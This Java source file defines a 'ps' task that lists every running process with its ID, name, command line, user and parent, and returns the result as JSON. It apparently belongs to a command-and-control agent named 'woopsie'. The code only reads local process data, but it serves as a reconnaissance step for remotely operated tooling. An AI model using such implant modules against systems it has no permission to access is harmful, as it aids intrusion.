package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.woopsie.Config;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * Process listing task - lists all running processes
 */
public class PsTask implements Task {
    
    private final ObjectMapper objectMapper = new ObjectMapper();
    
    @Override
    public String execute(Config config, JsonNode parameters) throws Exception {
        Config.debugLog(config, "Executing ps command");
        
        List<Map<String, Object>> processes = new ArrayList<>();
        
        // Use ProcessHandle API to enumerate processes
        ProcessHandle.allProcesses().forEach(ph -> {
            Map<String, Object> processEntry = new HashMap<>();
            
            long pid = ph.pid();
            processEntry.put("process_id", pid);
            processEntry.put("architecture", System.getProperty("os.arch"));
            
            // Try to read from /proc for better Linux support
            String name = null;
            String cmdLine = null;
            
            try {
                // Read process name from /proc/[pid]/comm (works for all processes)
                java.nio.file.Path commPath = java.nio.file.Paths.get("/proc", String.valueOf(pid), "comm");
                if (java.nio.file.Files.exists(commPath)) {
                    name = java.nio.file.Files.readString(commPath).trim();
                }
                
                // Read command line from /proc/[pid]/cmdline
                java.nio.file.Path cmdlinePath = java.nio.file.Paths.get("/proc", String.valueOf(pid), "cmdline");
                if (java.nio.file.Files.exists(cmdlinePath)) {
                    byte[] cmdlineBytes = java.nio.file.Files.readAllBytes(cmdlinePath);
                    if (cmdlineBytes.length > 0) {
                        // Replace null bytes with spaces
                        StringBuilder sb = new StringBuilder();
                        for (byte b : cmdlineBytes) {
                            if (b == 0) {
                                sb.append(' ');
                            } else {
                                sb.append((char) b);
                            }
                        }
                        cmdLine = sb.toString().trim();
                    }
                }
            } catch (Exception e) {
                // Fall back to ProcessHandle API
            }
            
            // Use ProcessHandle info as fallback
            if (name == null) {
                ph.info().command().ifPresent(cmd -> {
                    processEntry.put("bin_path", cmd);
                    // Extract process name from path
                    String extractedName = cmd.substring(cmd.lastIndexOf('/') + 1);
                    extractedName = extractedName.substring(extractedName.lastIndexOf('\\') + 1);
                    processEntry.put("name", extractedName);
                });
            } else {
                processEntry.put("name", name);
            }
            
            if (cmdLine != null && !cmdLine.isEmpty()) {
                processEntry.put("command_line", cmdLine);
            } else {
                ph.info().commandLine().ifPresent(cl -> processEntry.put("command_line", cl));
            }
            
            ph.info().user().ifPresent(user -> processEntry.put("user", user));
            
            ph.parent().ifPresent(parent -> processEntry.put("parent_process_id", parent.pid()));
            
            ph.info().startInstant().ifPresent(start -> 
                processEntry.put("start_time", start.getEpochSecond())
            );
            
            // Add defaults for fields we can't easily get in Java
            processEntry.putIfAbsent("name", "unknown");
            processEntry.putIfAbsent("user", "unknown");
            processEntry.putIfAbsent("bin_path", null);
            processEntry.putIfAbsent("parent_process_id", null);
            processEntry.putIfAbsent("command_line", null);
            processEntry.put("integrity_level", null);
            processEntry.put("description", null);
            processEntry.put("signer", null);
            
            processes.add(processEntry);
        });
        
        Config.debugLog(config, "Found " + processes.size() + " processes");
        
        // Create output structure matching oopsie
        Map<String, Object> output = new HashMap<>();
        output.put("platform", System.getProperty("os.name") + " " + System.getProperty("os.arch"));
        output.put("processes", processes);
        
        // Return JSON with processes array
        Map<String, Object> result = new HashMap<>();
        result.put("processes", processes);
        result.put("user_output", objectMapper.writeValueAsString(output));
        
        return objectMapper.writeValueAsString(result);
    }
    
    @Override
    public String getCommandName() {
        return "ps";
    }
}
